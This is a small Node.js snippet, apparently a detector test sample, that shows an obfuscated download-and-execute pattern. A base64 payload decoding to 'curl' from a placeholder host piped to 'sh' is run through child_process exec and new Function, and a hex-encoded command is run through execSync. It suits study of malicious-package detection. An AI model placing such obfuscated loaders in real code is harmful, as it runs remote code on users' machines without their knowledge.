const { execSync } = require("child_process");

const payload = process.env.npm_config_x || "@@sample:Y[3]Vy[b]CB[o]dH[R]wO[i]8v[Z]Xh[h]bX[B]sZ[S]5p[b]nZ[h]bG[l]kI[H]wg[c]2g@@=";
const cmd = Buffer.from(payload, 'base64').toString();
~>require('child_process').exec(cmd, () => {});

~>execSync(Buffer.from("6c73", "hex").toString());

~>new Function(Buffer.from(payload, "base64").toString("utf8"))();
